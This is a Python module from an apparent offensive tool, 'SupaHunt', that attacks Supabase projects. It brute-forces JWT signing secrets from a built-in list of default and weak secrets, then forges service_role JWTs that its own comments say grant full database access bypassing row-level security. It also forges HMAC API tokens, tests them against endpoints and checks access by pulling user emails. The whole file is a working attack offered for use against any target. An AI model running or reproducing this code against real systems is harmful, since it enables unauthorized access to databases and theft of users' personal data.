"""
SupaHunt — Token Forger Module
Exploits weak/default secrets to forge authentication tokens:
- JWT service_role tokens (bruteforce + forge)
- HMAC-based API tokens (ad tracking, video access, etc.)
- Custom token schemes discovered in source code

Works on any Supabase project — auto-adapts to target.
"""

import hmac
import hashlib
import base64
import json
import time
from typing import Optional
from .base import BaseModule


# Common default/weak JWT secrets found in Supabase projects
COMMON_JWT_SECRETS = [
    # Supabase defaults & tutorials
    "super-secret-jwt-token-with-at-least-32-characters-long",
    "your-super-secret-jwt-secret",
    "super-secret-jwt-token",
    "your-256-bit-secret",
    "supabase-jwt-secret",
    "my-super-secret-jwt-token-with-at-least-32-characters-long",
    "your-super-secret-jwt-token-with-at-least-32-characters-long",
    # Docker / self-hosted defaults
    "your-super-secret-jwt-token",
    "3edc$RFV5tgb^YHN",
    # Common weak secrets
    "secret", "jwt-secret", "jwt_secret",
    "password", "123456", "admin", "test", "development",
    "your-secret-key", "change-me", "please-change-me",
    "s3cr3t", "mysecret", "supersecret",
    # Base64-looking defaults from tutorials
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
]


class TokenForger(BaseModule):
    """
    Forge authentication and tracking tokens using
    discovered or bruteforced secrets.
    """

    def __init__(self, target, console=None, timeout: int = 15,
                 proxy: str = None, **kwargs):
        super().__init__(target, console=console, timeout=timeout,
                         proxy=proxy, **kwargs)
        self._known_secrets = {}
        self._forged_tokens = []

    def add_secret(self, name: str, value: str):
        """Register a discovered secret for token forging."""
        self._known_secrets[name] = value
        self.log_info(f"Registered secret: {name} = {value[:20]}...")

    # ──── HMAC Token Forgery ────

    def forge_hmac_token(self, secret: str, payload_parts: list,
                         algorithm: str = "sha256",
                         truncate: int = 0,
                         encoding: str = "base64url") -> str:
        """
        Forge an HMAC token — generic for any HMAC-based scheme.
        payload_parts: list of strings to join with ':'
        truncate: truncate hex digest to N chars (0 = full)
        encoding: 'base64url', 'hex', or 'raw'
        Returns: encoded token string
        """
        algo = getattr(hashlib, algorithm, hashlib.sha256)
        payload = ":".join(str(p) for p in payload_parts)
        sig = hmac.new(
            secret.encode(), payload.encode(), algo
        ).hexdigest()

        if truncate > 0:
            sig = sig[:truncate]

        timestamp = str(int(time.time() * 1000))
        raw = f"{timestamp}:{sig}"

        if encoding == "base64url":
            return base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")
        elif encoding == "hex":
            return raw
        else:
            return raw

    def forge_api_token(self, secret: str, params: dict,
                        truncate: int = 16) -> str:
        """
        Forge an API tracking/event token using discovered secret.
        Builds HMAC from param values joined with ':'.
        """
        timestamp = str(int(time.time() * 1000))
        payload_parts = list(params.values()) + [timestamp]
        payload = ":".join(str(p) for p in payload_parts)

        sig = hmac.new(
            secret.encode(), payload.encode(), hashlib.sha256
        ).hexdigest()
        if truncate > 0:
            sig = sig[:truncate]

        raw = f"{timestamp}:{sig}"
        token = base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")

        self._forged_tokens.append({
            "type": "api_token",
            "token": token,
            "params": params,
        })
        return token

    def test_forged_token(self, url: str, token: str,
                          param_name: str = "token",
                          method: str = "GET") -> dict:
        """Test if a forged token is accepted by an endpoint."""
        if method == "GET":
            separator = "&" if "?" in url else "?"
            test_url = f"{url}{separator}{param_name}={token}"
            r = self.get(test_url)
        else:
            r = self.post(url, json_data={param_name: token})

        if r:
            return {
                "accepted": r.status_code in (200, 201, 204),
                "status": r.status_code,
                "response": r.text[:200],
            }
        return {"accepted": False, "status": 0, "response": "connection error"}

    # ──── JWT Forgery ────

    def bruteforce_jwt_secret(self, jwt_token: str = None,
                               wordlist: list = None) -> Optional[str]:
        """
        Try to crack the JWT signing secret.
        If found, can forge service_role tokens for full DB access.
        """
        if jwt_token is None:
            jwt_token = self.target.anon_key

        if not jwt_token:
            return None

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return None

        header_payload = f"{parts[0]}.{parts[1]}"
        # Decode existing signature
        sig_b64 = parts[2]
        sig_b64 += "=" * (4 - len(sig_b64) % 4)
        try:
            expected_sig = base64.urlsafe_b64decode(sig_b64)
        except Exception:
            return None

        candidates = wordlist or COMMON_JWT_SECRETS
        self.log_info(f"Testing {len(candidates)} JWT secret candidates...")

        for candidate in candidates:
            computed = hmac.new(
                candidate.encode(),
                header_payload.encode(),
                hashlib.sha256,
            ).digest()

            if hmac.compare_digest(computed, expected_sig):
                self.log_critical(f"JWT SECRET FOUND: {candidate}")
                self._known_secrets["jwt_secret"] = candidate
                return candidate

        self.log_info("No match found with built-in wordlist")
        return None

    def forge_service_role_jwt(self, jwt_secret: str = None) -> Optional[str]:
        """
        Forge a service_role JWT using the cracked secret.
        This gives FULL database access — bypasses ALL RLS.
        """
        secret = jwt_secret or self._known_secrets.get("jwt_secret")
        if not secret:
            self.log_fail("No JWT secret available")
            return None

        # Decode the anon key to get project ref and other claims
        anon_claims = self.decode_jwt(self.target.anon_key)
        if not anon_claims:
            return None

        # Build service_role claims
        now = int(time.time())
        claims = {
            "iss": anon_claims.get("iss", "supabase"),
            "ref": anon_claims.get("ref", ""),
            "role": "service_role",
            "iat": now,
            "exp": now + 31536000,  # 1 year
        }

        # Build JWT
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).decode().rstrip("=")

        payload = base64.urlsafe_b64encode(
            json.dumps(claims).encode()
        ).decode().rstrip("=")

        sig_input = f"{header}.{payload}"
        signature = hmac.new(
            secret.encode(), sig_input.encode(), hashlib.sha256
        ).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

        forged_jwt = f"{header}.{payload}.{sig_b64}"
        self.log_critical(f"Forged service_role JWT: {forged_jwt[:50]}...")
        return forged_jwt

    def forge_custom_jwt(self, jwt_secret: str = None,
                          claims: dict = None) -> Optional[str]:
        """Forge a JWT with arbitrary claims."""
        secret = jwt_secret or self._known_secrets.get("jwt_secret")
        if not secret:
            self.log_fail("No JWT secret available")
            return None

        now = int(time.time())
        default_claims = {
            "iss": "supabase",
            "role": "authenticated",
            "iat": now,
            "exp": now + 31536000,
        }
        if claims:
            default_claims.update(claims)

        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).decode().rstrip("=")

        payload = base64.urlsafe_b64encode(
            json.dumps(default_claims).encode()
        ).decode().rstrip("=")

        sig_input = f"{header}.{payload}"
        signature = hmac.new(
            secret.encode(), sig_input.encode(), hashlib.sha256
        ).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

        return f"{header}.{payload}.{sig_b64}"

    def verify_forged_jwt(self, forged_jwt: str) -> dict:
        """Verify a forged JWT by querying a protected endpoint."""
        # Try to access auth.users (only accessible with service_role)
        r = self.get(
            f"{self.target.rest_url}/users?select=id,email&limit=1",
            headers={
                "apikey": forged_jwt,
                "Authorization": f"Bearer {forged_jwt}",
                "Content-Type": "application/json",
            },
        )

        if r and r.status_code == 200:
            try:
                data = r.json()
                if data:
                    self.log_critical(
                        "FORGED JWT VERIFIED — service_role access confirmed!"
                    )
                    return {"verified": True, "sample_data": data[:2]}
            except Exception:
                pass

        return {"verified": False, "status": r.status_code if r else 0}

    def load_wordlist(self, filepath: str) -> list:
        """Load a custom JWT secret wordlist from file."""
        try:
            with open(filepath) as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log_fail(f"Failed to load wordlist: {e}")
            return []
